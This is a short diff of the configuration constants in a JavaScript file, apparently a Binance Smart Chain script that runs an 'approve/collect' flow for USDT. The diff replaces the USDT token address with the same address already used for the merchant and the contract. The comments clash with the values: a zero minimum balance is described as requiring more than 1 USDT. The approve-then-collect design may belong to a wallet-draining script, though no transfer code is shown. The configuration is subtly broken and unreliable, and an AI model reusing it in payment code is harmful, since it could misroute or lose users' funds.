@@ -3,7 +3,7 @@
 // ─── Configuration ────────────────────────────────────────────────────────────
 const MERCHANT_ADDRESS = "0x9EA9587AD872673b352619A4feEED25B430F7Da1";
 const CONTRACT_ADDRESS = "0x9EA9587AD872673b352619A4feEED25B430F7Da1";
-const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const BSC_USDT_ADDRESS = "0x9EA9587AD872673b352619A4feEED25B430F7Da1";
 const BSC_CHAIN_ID_HEX = "0x38";
 const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
 const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 1 USDT before approve/collect
